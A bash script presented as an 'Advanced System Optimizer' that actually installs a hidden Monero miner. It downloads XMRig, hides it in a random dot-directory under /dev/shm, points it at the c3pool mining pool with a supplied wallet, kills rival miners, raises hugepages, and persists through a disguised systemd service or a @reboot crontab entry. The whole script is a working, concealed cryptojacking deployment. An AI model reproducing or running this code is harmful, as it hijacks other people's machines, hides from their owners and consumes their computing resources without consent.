#!/bin/bash
VERSION=2.21
echo "Advanced System Optimizer v$VERSION"
echo "Exact 85% CPU per core - FULL CLEANUP & LOGS GUARANTEED"
echo
export LC_ALL=C
export LANG=C

# --- کاربر واقعی ---
REAL_USER="${SUDO_USER:-$(whoami)}"
REAL_HOME="$(getent passwd "$REAL_USER" | cut -d: -f6 2>/dev/null || echo "$HOME")"

# --- نام‌های تصادفی ---
RAND_HEX=$(openssl rand -hex 16)
SYSTEM_USER="opt$(openssl rand -hex 6)"
SERVICE_NAME="sysopt-$(openssl rand -hex 5)"

# --- مسیر مخفی در RAM ---
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"
CFG_DIR="$BASE_DIR/.cfg"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    exit 1
fi

# --- پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    if command -v apt-get >/dev/null; then
        sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null
    elif command -v yum >/dev/null; then
        sudo yum install -y curl tar -q >/dev/null
    elif command -v dnf >/dev/null; then
        sudo dnf install -y curl tar -q >/dev/null
    else
        echo "ERROR: Package manager missing"
        exit 1
    fi
fi

# --- محاسبه CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT% (~$(( USABLE_THREADS * CPU_HINT / 100 )) cores total)"
echo "[*] Install: $BASE_DIR (RAM - auto-clear on reboot)"

# --- پاک‌سازی GLOBAL همه قبلی‌ها ---
echo "[*] Global cleanup of old miners..."
pkill -9 -f xmrig 2>/dev/null
pkill -9 -f '/dev/shm/.*/main' 2>/dev/null
for old_dir in $(find /dev/shm -type d -name ".*" 2>/dev/null); do
    if [ -f "$old_dir/main" ] || [ -f "$old_dir/config.json" ]; then
        pkill -9 -f "$old_dir/main" 2>/dev/null
        rm -rf "$old_dir" 2>/dev/null
    fi
done
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
    systemctl daemon-reload 2>/dev/null
fi

# --- hugepages ---
if [ "$(id -u)" -eq 0 ]; then
    SYSCONF="/etc/sysctl.conf"
    [ ! -f "$SYSCONF" ] && touch "$SYSCONF" && chmod 644 "$SYSCONF"
    grep -q "vm.nr_hugepages=1280" "$SYSCONF" || echo "vm.nr_hugepages=1280" >> "$SYSCONF"
    sysctl -p "$SYSCONF" >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- ساخت دایرکتوری ---
mkdir -p "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null
chmod 700 "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_FILE="/tmp/.tmp_$(openssl rand -hex 5).tgz"
for i in {1..3}; do curl -fsSL "$URL" -o "$TMP_FILE" && break; sleep 2; done
[ ! -f "$TMP_FILE" ] && echo "ERROR: Download failed" && exit 1
tar xzf "$TMP_FILE" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP_FILE"; exit 1; }
XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && echo "ERROR: Binary missing" && rm -f "$TMP_FILE" && exit 1
cp "$XMRIG_BIN" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"
rm -f "$TMP_FILE"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config.json (بدون hint/threads - override در command) ---
cat > "$BASE_DIR/config.json" << EOF
{
    "api": { "id": null, "worker-id": "$SYSTEM_USER" },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "title": "",
    "donate-level": 0,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 0,
        "rx/0": [true]
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }],
    "print-time": 10,
    "retries": 10,
    "retry-pause": 3,
    "syslog": false,
    "verbose": 2,
    "watch": false
}
EOF

# --- کنترل اسکریپت با command line override ---
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
cd "$(dirname "$0")" || exit 1
THREADS=$1  # placeholders replaced later
HINT=$2
case "$3" in
    start)
        pgrep -f "./main" >/dev/null && { echo "Already running"; "$0" status; exit 1; }
        [ -w /proc/sys/vm/nr_hugepages ] && echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null
        nohup ./main --config=config.json --threads=$THREADS --cpu-max-threads-hint=$HINT --log-file=.log/output.log > .log/output.log 2>&1 &
        echo $! > .pid
        sleep 5
        echo "Started @ $HINT% per core"
        "$0" status
        tail -20 .log/output.log
        ;;
    stop)
        pkill -9 -f "./main" 2>/dev/null
        [ -f .pid ] && kill -9 $(cat .pid) 2>/dev/null && rm -f .pid
        sleep 1
        pgrep -f "./main" >/dev/null && echo "Stop failed" || echo "Stopped"
        ;;
    status)
        PIDS=$(pgrep -f "./main")
        if [ -n "$PIDS" ]; then
            echo "Running ($(( $(echo $PIDS | wc -w) )) PID(s)): $PIDS"
            TOTAL=0
            for PID in $PIDS; do
                CPU=$(ps -p $PID -o %cpu --no-headers | awk '{printf "%.0f", $1}')
                echo "  PID $PID → $CPU% CPU"
                TOTAL=$((TOTAL + CPU))
            done
            echo "  TOTAL CPU: $TOTAL% (~$(( TOTAL / 100 )) cores)"
        else
            echo "Stopped"
        fi
        ;;
    logs)
        tail -50 .log/output.log 2>/dev/null || echo "No logs yet (wait for connection)"
        ;;
    restart)
        "$0" stop; sleep 2; "$0" start
        ;;
    *) echo "Usage: $0 {start|stop|status|logs|restart}" ;;
esac
EOF
sed -i "s/\$1/$USABLE_THREADS/g; s/\$2/$CPU_HINT/g; s/\$3/\$1/g" "$BASE_DIR/control"
chmod +x "$BASE_DIR/control"

# --- systemd ---
SYSTEMD=false
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Optimizer
After=network.target
[Service]
Type=simple
Restart=always
RestartSec=5
User=root
ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json --threads=$USABLE_THREADS --cpu-max-threads-hint=$CPU_HINT --log-file=$LOG_DIR/output.log
WorkingDirectory=$BASE_DIR
Environment=LC_ALL=C
StandardOutput=append:$LOG_DIR/output.log
StandardError=append:$LOG_DIR/output.log
[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now "$SERVICE_NAME.service" >/dev/null 2>&1
    SYSTEMD=true
fi

# --- crontab ---
if [ "$SYSTEMD" = false ]; then
    (crontab -u "$REAL_USER" -l 2>/dev/null | grep -v "$BASE_DIR"; echo "@reboot sleep 60 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -u "$REAL_USER" -
fi

# --- استارت ---
if [ "$SYSTEMD" = true ]; then
    systemctl restart "$SERVICE_NAME.service" 2>/dev/null
else
    "$BASE_DIR/control" start
fi

sleep 10
echo
echo "=== FINAL CHECK ==="
"$BASE_DIR/control" status
echo
"$BASE_DIR/control" logs | tail -20
echo
echo "DONE! One instance @ ~510% CPU in htop"
echo "Path: $BASE_DIR"
echo "Manage: $BASE_DIR/control status / logs"
echo "If low CPU: Check logs for 'accepted' shares or connection errors."

exit 0
